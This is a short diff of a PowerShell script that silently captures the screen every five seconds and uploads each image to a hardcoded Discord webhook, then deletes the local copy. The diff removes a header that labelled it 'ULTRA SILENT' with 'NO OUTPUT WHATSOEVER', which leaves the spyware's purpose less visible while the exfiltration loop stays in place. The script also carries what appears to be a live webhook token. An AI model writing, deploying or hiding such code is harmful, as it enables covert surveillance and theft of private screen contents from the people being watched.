@@ -1,8 +1,3 @@
-# ===============================================
-# ULTRA SILENT SCREENSHOT - EVERY 5 SECONDS
-# NO OUTPUT WHATSOEVER
-# ===============================================
-
 $webhookUrl = "https://discord.com/api/webhooks/1507397879671685150/oRYUF8gCcyWpGAaRLBMA1pdAAvjRPq0iCfA7eXbnqI6-PZTVICQsAn-wbTbwjKMHyWoa"
 
 Add-Type -AssemblyName System.Windows.Forms
@@ -30,7 +25,7 @@ function Send-ToDiscord {
     Remove-Item $filePath -Force -ErrorAction SilentlyContinue
 }
 
-# Main Loop - 5 seconds
+# Main loop - every 5 seconds
 while ($true) {
     $path = Take-Screenshot
     Send-ToDiscord -filePath $path
